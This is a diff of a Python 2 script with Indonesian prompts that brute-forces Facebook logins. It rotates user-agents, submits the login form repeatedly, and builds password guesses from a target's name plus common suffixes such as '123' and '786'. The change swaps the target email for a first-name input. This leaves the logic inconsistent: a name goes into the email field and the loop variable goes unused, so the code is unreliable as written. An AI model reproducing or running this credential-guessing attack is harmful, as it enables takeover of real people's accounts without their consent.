@@ -28,7 +28,7 @@ os.system('clear')
 print logo
 print
 print 42*"\033[1;96m="
-email = str(raw_input("\033[1;96m[+] \033[1;93mUsername/Email/No HP target \033[1;97m: "))
+first_name = str(raw_input("\033[1;96m[+] \033[1;93mNama Depan FB \033[1;97m: "))
 
 passwordlist = str(raw_input("\033[1;96m[+] \033[1;93mWordlist \033[1;97m: "))
 
@@ -60,7 +60,7 @@ def brute(password):
 	br.addheaders = [('User-agent', random.choice(useragents))]
 	site = br.open(login)
 	br.select_form(nr = 0)
-	br.form['email'] = email
+	br.form['email'] = first_name
 	br.form['pass'] = password
 	sub = br.submit()
 	log = sub.geturl()
@@ -77,19 +77,19 @@ def search():
 		ss = users[0].split(' ')
 		for x in ss:
 			listpass = [
-				str(x) + '123',
-				str(x) + '786',
-				str(x) + '12345',
-				str(x) + '@123',
-				str(x) + '12',
-				str(x) + '123456',
-  				str(x) + '1234',
-				str(x) + '121',
-				str(x) + '001',
-				str(x) + '111',
-				str(x) + '2020',
-				str(x) + '10',
-				str(x)
+				str(first_name) + '123',
+				str(first_name) + '786',
+				str(first_name) + '12345',
+				str(first_name) + '@123',
+				str(first_name) + '12',
+				str(first_name) + '123456',
+  				str(first_name) + '1234',
+				str(first_name) + '121',
+				str(first_name) + '001',
+				str(first_name) + '111',
+				str(first_name) + '2020',
+				str(first_name) + '10',
+				str(first_name)
 				]
 			listpass.append(passwordlist)
  			for passw in set(listpass):
